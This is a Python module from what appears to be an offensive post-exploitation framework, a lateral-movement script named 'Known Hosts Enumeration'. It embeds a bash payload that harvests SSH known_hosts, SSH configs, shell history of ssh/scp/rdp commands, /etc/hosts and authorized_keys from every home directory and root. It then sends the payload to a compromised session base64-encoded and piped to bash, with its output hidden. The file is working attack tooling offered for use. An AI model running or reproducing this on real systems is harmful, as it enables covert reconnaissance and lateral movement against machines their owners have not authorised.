"""Known hosts enumeration script."""

from ..base import OperatorScript, ScriptResult


class KnownHostsEnum(OperatorScript):
    """Parse SSH known_hosts and connection history."""
    
    name = "Known Hosts Enumeration"
    description = "Extract SSH known_hosts and connection history"
    category = "lateral"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] KNOWN HOSTS ENUMERATION"
echo "==========================="
echo ""

echo "[+] SSH known_hosts files:"
find /home /root -name "known_hosts" 2>/dev/null | while read file; do
    echo "[!] $file"
    cat "$file" 2>/dev/null | while read line; do
        if [[ $line =~ ^[^#] ]]; then
            HOST=$(echo "$line" | awk '{print $1}' | tr ',' '\n')
            echo "  - $HOST"
        fi
    done
    echo ""
done

echo "[+] SSH config files:"
find /home /root /etc/ssh -name "config" 2>/dev/null | while read file; do
    echo "[!] $file"
    grep -E "^Host |^  Hostname|^  User|^  Port" "$file" 2>/dev/null
    echo ""
done

echo "[+] Bash history (SSH/SCP/RDP connections):"
find /home /root -name ".bash_history" -o -name ".zsh_history" 2>/dev/null | while read file; do
    echo "[!] $file"
    grep -E "ssh |scp |sftp |rdp |rdesktop |xfreerdp " "$file" 2>/dev/null | tail -20
    echo ""
done

echo "[+] Recently accessed hosts (from /etc/hosts):"
cat /etc/hosts 2>/dev/null | grep -v "^#" | grep -v "^127" | grep -v "^::"

echo ""
echo "[+] Authorized SSH keys:"
find /home /root -name "authorized_keys" 2>/dev/null | while read file; do
    echo "[!] $file"
    wc -l "$file"
done
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Enumerating known hosts...[/bold cyan]")
            
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            
            return ScriptResult(
                success=True,
                output="Known hosts enumeration executed",
                metadata={"script": "known_hosts_enum"}
            )
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
